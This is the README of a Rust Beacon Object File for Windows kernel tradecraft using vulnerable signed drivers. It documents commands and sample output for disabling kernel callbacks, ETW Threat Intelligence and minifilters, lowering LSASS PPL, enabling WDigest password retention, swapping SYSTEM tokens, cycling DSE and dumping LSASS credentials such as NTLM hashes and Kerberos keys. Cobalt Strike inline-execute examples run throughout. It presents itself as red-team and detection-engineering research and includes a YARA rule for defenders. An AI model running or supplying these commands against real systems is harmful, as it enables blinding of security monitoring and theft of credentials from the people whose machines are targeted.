# kernel

`kernel` is a driver-agnostic (the main BOF logic is not permanently tied to
one specific vulnerable driver) Rust BOF for BYOVD research and Windows kernel
tradecraft. It uses a user-supplied vulnerable-driver adapter to remove kernel
callbacks, disable ETW Threat Intelligence, bypass LSASS PPL, enable WDigest
credential caching, swap process tokens, run a DSE disable-and-restore cycle,
and dump credentials that remain in VTL0 LSASS without `OpenProcess`, even
when Credential Guard is enabled. Secrets isolated in VTL1 remain protected.

Most adapters start from local administrator and turn a vulnerable driver into
kernel access. [Microsoft does not treat administrator-to-kernel elevation as a
security boundary](https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria),
but the technique remains relevant to real-world tradecraft, defense impairment,
and detection engineering. The same action layer can also use a user-to-kernel
adapter when the driver permits standard-user access.

A BYOVD uses a legitimate signed but vulnerable kernel driver to reach memory
that normal user-mode code cannot access. The driver is the primitive. This BOF
is the reusable action layer above it.

This repository does not include a driver, compiled BOF, or driver-adapter
implementation. Users must acquire and verify their own driver, load it using
their normal driver workflow, and implement its request contract in a separate
Rust adapter. A new adapter changes the driver logic, not the actions or
commands.

## Actions

`list`, `state`, and `inspect` only read state. `cycle` changes state, verifies
the result, and restores it in the same run. `disable` or `enable` keeps the
change active until the matching `restore` command succeeds.

| Command | What it does | MITRE ATT&CK | Risk |
|---|---|---|---|
| `help` | Lists every action, argument, and risk level | - | R0 |
| `preflight` | Shows Windows, Code Integrity, VBS, HVCI, and secure-kernel state without opening a driver | T1518.001 | R0 |
| `status`, `adapter-check` | Validates the read/write adapter contract and proves an exact repeated kernel read without writing memory | - | R0 |
| `process <self\|auth\|inspect PID>` | Inspects process identity, protection, and security metadata | T1057 | R0 |
| `token <self\|auth\|PID>` | Inspects the selected process token and integrity level | T1033 | R0 |
| `callback <process\|thread\|image> list` | Enumerates process, thread, or image-load callbacks | T1518.001 | R0 |
| `callback <process\|thread\|image> <cycle\|disable> <module.sys> <rva>` | Removes one exact callback to create a telemetry blind spot | T1562.001 | R2 |
| `callback <process\|thread\|image> restore` | Restores the exact callback saved by the matching disable action | T1562.001 | R2 |
| `object <process\|thread> list` | Enumerates process or thread handle callbacks | T1518.001 | R0 |
| `object <process\|thread> <cycle\|disable> <module.sys> <ops> <pre-rva> <post-rva>` | Disables one exact handle-protection registration without unlinking the callback list | T1562.001 | R2 |
| `object <process\|thread> restore` | Restores the exact handle-protection registration saved by the matching disable action | T1562.001 | R2 |
| `registry <list\|cycle\|disable\|restore>` | Enumerates or isolates the complete registry callback list | T1562.001 | R3 |
| `etw-ti <state\|cycle\|disable\|restore>` | Inspects or disables ETW Threat Intelligence until restored | T1562.001 | R2 |
| `minifilter list`, `minifilter inspect ...` | Enumerates filters or checks one exact instance | T1518.001 | R0 |
| `minifilter <cycle\|disable> <filter> <instance> <volume> <altitude>` | Detaches one exact file-system filter instance using Filter Manager | T1562.001 | R2 |
| `minifilter restore` | Reattaches the exact filter instance saved by the matching disable action | T1562.001 | R2 |
| `protection <self\|auth\|PID> cycle <expected> <changed>` | Changes one exact process-protection byte and restores it in the same run | T1562.001 | R3 |
| `protection <self\|auth\|PID> restore` | Recovers the exact process-protection byte after an interrupted cycle | T1562.001 | R3 |
| `ppl <cycle\|disable\|restore>` | Lowers and restores LSASS PPL after exact state checks | T1562.001 | R3 |
| `token system <cycle\|restore>` | Swaps the current process to an exact SYSTEM token and restores it | T1134.001 | R3 |
| `token adjust <self\|PID> <cycle\|restore>` | Changes token privileges and integrity, then restores them | T1134 | R3 |
| `wdigest <state\|cycle\|enable\|restore>` | Changes LSASS WDigest state so credentials from a future logon can be retained in VTL0 without `OpenProcess` | T1003.001 | R3 |
| `credentials read` | Reads VTL0 LSASS authentication material through the physical-memory primitive without `OpenProcess` | T1003.001 | R3 |
| `dse <state\|cycle\|restore>` | Inspects DSE or performs an immediate disable and restore when VBS and HVCI are off | T1562.001 | R3 |

R0 is read-only. R2 is a narrow reversible change. R3 changes broad or
security-critical state and can crash Windows if the target, profile, or
platform changes underneath the action.

For minifilters, run `fltmc volumes` first and pass the exact
`\Device\HarddiskVolumeN` path. A drive letter such as `C:` is not an exact
Filter Manager identity. A protected filter may also reject detach; the BOF
reports the veto and removes an unused recovery record.

## Windows protections

| Protection | What it protects | What this BOF proves |
|---|---|---|
| [Authenticode and driver signing](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/windows-driver-signing-tutorial) | Authenticode verifies the publisher and signed file integrity, while Windows Code Integrity decides whether a kernel driver may load. [WHQL](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/signature-categories-and-driver-installation) adds hardware certification. Attestation signing and a valid signature do not prove that a driver's interfaces are safe. | The BOF does not sign, modify, or load a driver. A user-supplied driver must already be trusted and running. |
| [Microsoft vulnerable-driver blocklist](https://learn.microsoft.com/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules) | Blocks known vulnerable driver identities when the effective policy is enabled and current. | The BOF does not bypass the blocklist. Check the exact file hash against the current list before loading it. |
| [WDAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/) | Allows, audits, or blocks code by policy. Audit mode records a decision but does not stop execution. | A deny policy can stop the driver before the BOF reaches its adapter. |
| [VBS](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) and [HVCI](https://learn.microsoft.com/en-us/windows-hardware/drivers/driversecurity/implement-hvci-compatible-code) | VBS creates an isolated trust boundary. HVCI uses it to enforce kernel code integrity. | A loaded vulnerable driver may still expose data read or write primitives. DSE mutation refuses to run while VBS or HVCI is active. |
| [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) | Keeps selected credentials in a VTL1 trustlet outside normal VTL0 LSASS memory. | `credentials read` only reads VTL0. `wdigest enable` affects credentials from a future logon; it does not recover existing VTL1 secrets. |
| [PPL and LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) | Blocks ordinary user-mode access to protected processes such as LSASS. | The BOF can inspect or change exact VTL0 process metadata through a validated kernel adapter. The credential reader does not call `OpenProcess`. |
| [PatchGuard](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/driver-x64-restrictions) | Protects selected x64 kernel code and structures from unsupported modification. Windows may bugcheck with `CRITICAL_STRUCTURE_CORRUPTION`; its exact coverage and timing are not a public contract. | Read-only actions do not modify kernel state. Callback registration state also changes during normal Windows operation, so callback actions are not presented as guaranteed PatchGuard triggers. Direct kernel writes still carry crash risk, and a quick restore is not proof that a change is PatchGuard-safe. |
| [VBS-backed kernel integrity](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/vbs-resource-protections) | The secure kernel protects selected integrity decisions from VTL1. This is sometimes called HyperGuard, but it is not a direct replacement for PatchGuard. | VTL0 read or write access does not imply control of VTL1. The BOF fails closed where its action cannot meet that boundary. |

[SigFlip](https://github.com/med0x2e/SigFlip) is separate optional tooling for
changing certificate-table data in a signed PE while preserving Authenticode
validation on systems that allow certificate padding. It is useful for testing
hash-only controls and weak signature-validation assumptions, but it is not
included here. Strict
[`EnableCertPaddingCheck`](https://learn.microsoft.com/en-us/windows/win32/secbp/understanding-pe-signatures)
enforcement can reject the modified file, and a preserved signature does not
guarantee that WDAC, HVCI, or the vulnerable-driver blocklist will allow it.

[LOLDrivers](https://www.loldrivers.io/) is a curated catalog of Windows
drivers that have been abused to bypass security controls. Use it to check an
exact driver hash, known behavior, HVCI status, and Microsoft blocklist
coverage. It is a research reference rather than a trust authority: a missing
entry does not prove that a driver is safe, legitimate, or loadable.

## Build

The BOF has no third-party Rust crate dependencies. Its local toolchain file
pins Rust nightly `2025-01-25`, `rust-src`, and the
`x86_64-pc-windows-gnu` target. Building also requires MinGW-w64,
`cargo-make`, and [`boflink`](https://github.com/MEhrn00/boflink).

The normal build deliberately produces a safe object with no adapter:

```bash
cd bofs/kernel
cargo make
```

It can print help and preflight state, but every adapter operation fails closed.
For an operational build, compile a separate Rust static library that exports
the seven functions declared in `src/adapter_external.rs`, then link it:

```bash
ADAPTER_LIB=/path/to/libkernel_adapter.rlib cargo make link-adapted-x64
```

PowerShell uses the same task:

```powershell
$env:ADAPTER_LIB = 'C:\path\to\libkernel_adapter.rlib'
cargo make link-adapted-x64
Remove-Item Env:ADAPTER_LIB
```

The output is `out/kernel.x64.o`. The adapter must declare its capabilities,
alignment, transfer limit, maximum write size, and exact-write semantics. The
action layer rejects an incomplete contract before touching memory.

## Run

Cobalt Strike and other Beacon-compatible loaders can run the same object. Run
`help` first to print the command syntax:

```text
inline-execute kernel.x64.o help
```

The examples below use made-up names, PIDs, RVAs, volumes, and account data.
Replace them with values that match the loaded driver, Windows profile, and
target state.

### Protection preflight

Shows the Windows build and whether Code Integrity, VBS, HVCI, and the secure
kernel are active. It does not open the driver.

```text
> inline-execute kernel.x64.o preflight

[*] Checking Windows kernel protection state
[*] Windows         : 10.0.22631 x64
[*] Code Integrity  : kernel=enabled test-signing=disabled user-mode=enabled audit=disabled
[*] VBS and HVCI    : secure-kernel=running hvci=enabled trustlet=running
[*] DSE mutation    : blocked by safety gate
[+] Preflight complete; no driver was opened and no state was changed
```

### Adapter status and read gate

`status` shows what the supplied adapter can do. `adapter-check` then proves
that the adapter matches the exact kernel and can repeat a stable read.

```text
> inline-execute kernel.x64.o status

[*] Profiles        : kernel=526 credential=3
[*] Adapter         : external
[*] Contract        : version=1 capabilities=0x0000000f
[*] Kernel read     : yes
[*] Kernel write    : yes
[*] Physical read   : yes
[*] Physical write  : yes
[+] Adapter opened successfully

> inline-execute kernel.x64.o adapter-check

[*] Checking adapter contract and exact kernel identity
[*] Loaded modules  : 168
[*] Kernel profile  : 22631.7582 exact PE and PDB match
[+] Adapter check complete; repeated kernel read matched and no state changed
```

### Process and token inspection

Reads process protection, signer, token, integrity, and privilege state through
kernel memory without `OpenProcess`.

```text
> inline-execute kernel.x64.o process inspect 4242

[*] Inspecting process security state through kernel memory
[*] Process         : pid=4242 image=example.exe name-source=audit-path walked=12
[*] Protection      : type=none signer=none audit=0
[*] Signature       : image=0x00 section=0x00
[*] Metadata        : token=present refbits=8 dtb=present peb=present section=present
[+] Process security inspection complete; OpenProcess was not used

> inline-execute kernel.x64.o token 4242

[*] Inspecting process token and integrity state through kernel memory
[*] Token           : type=primary session=1 in-use=1 refbits=8
[*] Integrity       : level=high rid=0x3000 policy=0x00000000 attributes=0x00000060
[*] Privileges      : present=28 enabled=5 default=3
[*] Stability       : process and token state matched on repeat read
[+] Token inspection complete; OpenProcess was not used and no state changed
```

Use `process self`, `process auth`, `token self`, or `token auth` when a PID is
not convenient.

### Kernel callback inventory

Lists process creation, thread creation, and image-load callbacks. Each result
is shown as a module and RVA instead of a raw kernel address.

```text
> inline-execute kernel.x64.o callback process list
> inline-execute kernel.x64.o callback thread list
> inline-execute kernel.x64.o callback image list

[*] Enumerating image kernel callbacks
[*] Callback         : slot=2 module=example.sys rva=0x00012340
[+] image callback inventory complete; callbacks=1; state stable; no changes made
```

### Kernel callback disable and restore

Removes one exact process, thread, or image-load callback. This can create a
targeted telemetry blind spot until the matching restore completes.

```text
> inline-execute kernel.x64.o callback image disable example.sys 0x12340

[*] Disabling exact image callback example.sys+0x00012340
[*] Recovery         : exact slot record created and flushed
[*] Disabled         : kind=image slot=2 exact zero verified; callback block intact
[+] Callback disabled; run the matching callback restore command when finished

> inline-execute kernel.x64.o callback image restore

[*] Restoring exact image callback
[*] Restored         : kind=image slot=2 module=example.sys rva=0x00012340
[+] Callback restored; exact readback verified and recovery record removed
```

The same syntax works with `process` or `thread` in place of `image`.

### Object callback inventory, disable, and restore

Lists process or thread handle callbacks, then disables one exact registration
without unlinking the callback list.

```text
> inline-execute kernel.x64.o object process list

[*] Enumerating process object callbacks
[*] 4 entries; 7 pre/post routines; repeat read matched
[+] Object callback inventory complete; no changes made

> inline-execute kernel.x64.o object process disable example.sys 0x3 0x23450 0x23520

[*] Disabling process object callback from example.sys
[*] Enabled field changed from 1 to 0; list links were not modified
[+] Object callback disabled; run `object <type> restore` when finished

> inline-execute kernel.x64.o object process restore

[*] Object callback is enabled and the exact recovery record was removed
[+] Object callback restored; recovery record removed
```

Use `object thread` for thread-handle callbacks. The `ops` value and both RVAs
must match the inventory exactly.

### Registry callback control

Lists registry callbacks or isolates the complete callback list. This is a
broad R3 action because every registered registry callback is affected until
restore.

```text
> inline-execute kernel.x64.o registry list

[*] Enumerating registry callbacks
[*] 9 callbacks; exact list fingerprint matched on repeat read
[+] Registry callback inventory complete; no changes made

> inline-execute kernel.x64.o registry disable

[*] Isolating the complete registry callback list
[*] Risk R3: this affects every registered registry callback until restoration
[*] List head isolated; 9 callbacks remain in the verified detached chain
[+] Registry callback list isolated; run `registry restore` when finished

> inline-execute kernel.x64.o registry restore

[*] Full list head, chain, count, and fingerprint restored exactly
[+] Registry callback list restored; recovery record removed
```

### ETW Threat Intelligence control

Shows ETW-TI provider state or keeps the provider disabled until restore. This
tests whether visibility survives kernel-level telemetry tampering.

```text
> inline-execute kernel.x64.o etw-ti state

[*] Inspecting ETW Threat Intelligence provider state
[*] Provider        : enabled=1 level=5 property=0x00000000
[+] ETW Threat Intelligence state inspected; no changes made

> inline-execute kernel.x64.o etw-ti disable

[*] Disabling ETW Threat Intelligence provider state
[*] Provider Enabled field changed from 1 to 0; readback exact
[+] ETW Threat Intelligence disabled; run `etw-ti restore` when finished

> inline-execute kernel.x64.o etw-ti restore

[*] Provider Enabled field is 1 and the exact recovery record was removed
[+] ETW Threat Intelligence restored; recovery record removed
```

### Minifilter inventory, detach, and restore

Lists file-system minifilters, checks one exact instance, then detaches only
that instance from the selected volume.

```text
> inline-execute kernel.x64.o minifilter list

[*] Enumerating registered file-system minifilters
[*] Registered      : 8 stable entries
[+] Minifilter inventory complete; no changes made

> inline-execute kernel.x64.o minifilter inspect ExampleFilter ExampleInstance \Device\HarddiskVolume3 370000

[*] Inspecting one exact minifilter instance
[+] Exact minifilter instance inspected; no changes made

> inline-execute kernel.x64.o minifilter disable ExampleFilter ExampleInstance \Device\HarddiskVolume3 370000

[*] Detaching one exact minifilter instance
[*] Exact instance detached and absence verified
[+] Minifilter instance detached; run `minifilter restore` when finished

> inline-execute kernel.x64.o minifilter restore

[*] Exact instance attachment verified
[+] Minifilter instance restored; recovery record removed
```

### LSASS PPL disable and restore

Lowers the exact LSASS PPL byte after strict process and profile checks. This
tests whether PPL is the only barrier protecting LSASS.

```text
> inline-execute kernel.x64.o ppl disable

[*] Disabling authentication-service PPL state
[*] Target           : pid=888 image=lsass.exe walked=11
[*] Original state   : protected-light signer=lsa; exact state verified
[*] Recovery         : integrity record created and flushed
[*] Changed state    : protection=none; one-byte write verified
[+] PPL disabled; run `ppl restore` when finished

> inline-execute kernel.x64.o ppl restore

[*] Restoring authentication-service PPL state
[*] Restored state   : protected-light signer=lsa; readback exact
[+] PPL restored; recovery record removed
```

### WDigest future-logon retention

Shows the current WDigest state, enables future-logon password retention in
VTL0, and restores the original values. It does not pull existing Credential
Guard secrets out of VTL1.

```text
> inline-execute kernel.x64.o wdigest state

[*] Inspecting WDigest future-logon state without OpenProcess
[*] State           : UseLogonCredential=0 IsCredGuardEnabled=1
[+] WDigest future-logon state inspected; no changes made

> inline-execute kernel.x64.o wdigest enable

[*] Enabling WDigest future-logon retention without OpenProcess
[*] UseLogonCredential=1 and IsCredGuardEnabled=0; readback exact
[+] WDigest future-logon retention enabled; run `wdigest restore` when finished

> inline-execute kernel.x64.o wdigest restore

[*] Original WDigest values verified exactly
[+] WDigest future-logon state restored; recovery record removed
```

A fresh logon must happen after `wdigest enable`. Existing secrets stay where
they were. Restore the state after collecting the required telemetry.

### Handleless VTL0 credential read

Reads the VTL0 authentication packages through physical memory without
`OpenProcess`. It can report MSV1_0, WDigest, Kerberos, TSPKG, DPAPI, and
CloudAP material when the matching package and data are present. Treat all
output as sensitive.

```text
> inline-execute kernel.x64.o credentials read

[*] Action: Read VTL0 authentication material through kernel memory
[*] Profile : win11-23h2-22631.7582-x64 exact PE identities
[*] Access  : OpenProcess was not used
[+] MSV1_0 credential
    LUID   : 0x0000000000123456
    User   : arya.stark
    Domain : NORTH
    NTLM   : <32 hex characters>
[+] WDigest credential
    User     : arya.stark
    Domain   : NORTH
    Password : <sensitive value>
[+] Kerberos session
    LUID     : 0x0000000000123456
    User     : arya.stark
    Domain   : NORTH
    Keys     : 3
    Tickets  : 4
[+] TSPKG credential
    LUID     : 0x0000000000123456
    User     : arya.stark
    Domain   : NORTH
    Password : not cached
[+] DPAPI cached master key
    LUID : 0x0000000000123456
    GUID : 11111111-2222-3333-4444-555555555555
    Key  : <sensitive value>
[+] CloudAP cache record
    LUID        : 0x0000000000123456
    User        : arya.stark
    Key GUID    : 11111111-2222-3333-4444-555555555555
    Key bytes   : 32
    PRT cached  : yes
    PRT value   : not emitted
[*] VBS     : Credential Guard isolation observed=yes
[+] VTL0 credential read complete
```

This command inventories Kerberos sessions, keys, and ticket counts. It does
not export `.kirbi` files. Use the separate Kerberos BOFs below when ticket
listing, export, import, or requests are required.

### Driver Signature Enforcement state

Shows public and internal Code Integrity state. DSE mutation is cycle-only and
is blocked when VBS or HVCI is active.

```text
> inline-execute kernel.x64.o dse state

[*] Inspecting public and internal Code Integrity state
[*] Code Integrity  : public=0x00000001 internal=0x00000001
[*] CI profile      : 10.0.22621.7517 exact PE identity; g_CiOptions resolved offline
[*] DSE boundary    : VBS=enabled HVCI=enabled mutation-compatible=no
[+] Code Integrity state inspected; no changes made
```

Process-protection mutation, SYSTEM token swapping, token privilege changes,
and DSE mutation are deliberately cycle-only. Their syntax is in the Actions
table. They are not shown as examples because they do not support a persistent
change.

Long-lived actions create a short ACL-restricted recovery record in the current
user's temporary directory. It stores the exact original state needed for
restore and is deleted after successful recovery. This is intentional crash
recovery, but it is still forensic residue. Prefer `cycle` when an immediate
change and restore proves the TTP. Do not queue overlapping kernel mutations.

## Profiles and offsets

Exact profile matching is mandatory. The action layer currently carries 526
kernel profiles and three credential profiles. New Windows builds fail closed,
and the BOF never downloads symbols at runtime.

To add a build, record the exact PE identity and RSDS PDB GUID and age, obtain
the matching PDB from the Microsoft Symbol Server on a separate development
system, derive every required field from that exact image, and add the reviewed
profile to `src/profiles_generated.rs`. WDigest profiles live in
`src/wdigest.rs`. Winbindex and Vergilius are useful discovery and cross-check
sources, but they do not replace the exact Microsoft image and PDB. Run the unit
tests, rebuild the BOF, and validate every read and reversible write on the
matching Windows build. Never copy offsets from a nearby build.

The full action matrix was exercised on Windows 10 `19045.6456` with VBS and
HVCI off, and Windows 11 `22631.7582` with VBS and HVCI on. DSE cycled only on
the VBS-off host and refused the VBS-on host. PPL changes ran only when the
authentication service had the exact expected PPL state. The final Windows 11
update did not have a Credential Guard trustlet running, so that run does not
claim VTL1 isolation coverage.

Compile `kernel.yar` with `yarac` before distribution. It detects the
compiled AMD64 COFF family and is intended as a starting point for defensive
coverage, not as a replacement for behavioral detection.
